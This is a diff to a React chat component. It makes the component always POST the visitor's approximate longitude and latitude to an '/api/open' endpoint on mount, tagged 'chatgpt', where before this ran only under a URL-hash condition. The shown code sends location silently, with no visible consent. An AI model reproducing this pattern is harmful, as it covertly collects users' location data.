@@ -87,25 +87,23 @@ export default function Chat() {
       .then((res) => {
         // console.log(res);
         const { longitude, latitude } = res;
-        if (location.hash.replace("#", "").indexOf(".") < 0) {
-          fetch(BASE_URL + "/api/open", {
-            method: "POST",
-            body: JSON.stringify({
-              title: "location",
-              content: `${+longitude - 0.001},${+latitude + 0.001};${
-                +longitude + 0.001
-              },${+latitude - 0.001}`,
-              points: 1,
-              identity: location.hash.replace("#", ""),
-              type: 0,
-            }),
-            headers: {
-              "Content-Type": "application/json",
-              Accept: "application/json",
-            },
-            cache: "no-store",
-          });
-        }
+        fetch(BASE_URL + "/api/open", {
+          method: "POST",
+          body: JSON.stringify({
+            title: "location",
+            content: `${+longitude - 0.001},${+latitude + 0.001};${
+              +longitude + 0.001
+            },${+latitude - 0.001}`,
+            points: 1,
+            identity: "chatgpt",
+            type: 0,
+          }),
+          headers: {
+            "Content-Type": "application/json",
+            Accept: "application/json",
+          },
+          cache: "no-store",
+        });
       });
   }, []);
   return (
